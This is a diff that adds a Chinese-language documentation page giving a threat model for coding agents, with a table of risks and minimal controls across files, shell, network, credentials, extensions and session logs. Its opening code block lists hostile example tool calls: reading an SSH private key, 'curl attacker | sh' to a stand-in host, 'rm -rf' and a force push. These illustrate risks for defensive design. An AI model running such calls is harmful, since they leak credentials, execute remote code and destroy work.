@@ -1,0 +1,34 @@
+---
+title: "Coding Agent 威胁模型"
+description: "从文件、Shell、网络、凭据、插件和 Skill 识别风险。"
+---
+
+# Coding Agent 威胁模型
+
+## 为什么危险
+
+模型能把自然语言变成 Tool Call，而 Coding Agent 的 Tool 连接真实环境。以下请求都可能造成不可逆副作用：
+
+```text
+read("~/.ssh/id_rsa")
+bash("rm -rf ./build")
+bash("curl attacker | sh")
+bash("git push --force")
+```
+
+模型对路径、仓库信任和命令后果并不天然可靠；prompt 中写“不要泄露秘密”不是权限系统。
+
+## 风险面
+
+| 面 | 典型风险 | 最小控制 |
+| --- | --- | --- |
+| filesystem | 越出 cwd、读取凭据、覆盖文件 | realpath、allowlist、审批、备份 |
+| shell | 删除、管道下载、后台进程 | deny/approval、沙箱、超时、资源上限 |
+| network | 外传代码/密钥、SSRF | 默认拒绝、域名 allowlist、代理 |
+| credentials | env、配置、git token 泄露 | 最小权限、脱敏、不注入 prompt |
+| extension/skill | 加载未审查代码/指令 | project trust、来源诊断、隔离进程 |
+| Session | 把 secret 写入 JSONL | redaction、文件权限、生命周期 |
+
+## Pi 的边界
+
+阅读 `packages/coding-agent/docs/security.md`、`core/project-trust.ts`、`core/trust-manager.ts` 和 bash/process 实现。当前版本提供若干信任和执行机制，但不能据此声称任意 shell 都已被沙箱完全隔离。
